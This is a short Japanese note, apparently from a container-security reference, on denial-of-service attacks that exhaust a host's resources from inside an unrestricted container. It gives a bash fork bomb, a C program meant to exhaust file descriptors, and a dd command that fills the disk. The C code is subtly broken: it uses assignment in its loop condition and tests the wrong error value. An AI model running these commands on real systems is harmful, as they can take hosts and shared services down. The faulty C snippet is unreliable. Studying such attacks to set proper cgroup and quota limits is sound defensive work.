# DoS

コンテナはホストとリソースを共有しているため、リソースの制限を適切に施していない場合、ホストに対する DoS となる可能性があります。

## Fork Bomb

cgroup などでプロセス数を制限していない場合、コンテナで大量にプロセスを生成することでシステムをダウンさせることができます。

```sh
:(){ :|:& };:
```

## 大量のファイルディスクリプタを生成する

開けるファイルディスクリプタ数には上限があるため、コンテナ内で大量にファイルディスクリプタを開くことでホスト側に影響を与えることができます。

```c
#include <stdio.h>
#include<string.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>

int main()
{
  char buf[100];
  for(int i=0; i=400275; i++) {
    sprintf(buf, "/tmp/%d", i);
    int fd = open(buf, O_CREAT);
    if ( fd == 1 ) {
      printf("max fd %d\n", i);
      break;
    }
    printf("open %d\n", i);
  }
  for(;;);
}
```

## ディスク容量の圧迫

コンテナにディスク容量制限がない場合は大きなファイルを作成することで、ホストのディスク容量を圧迫させることができます。

```sh
$ dd if=/dev/zero of=bigfile bs=20GB count=10
```
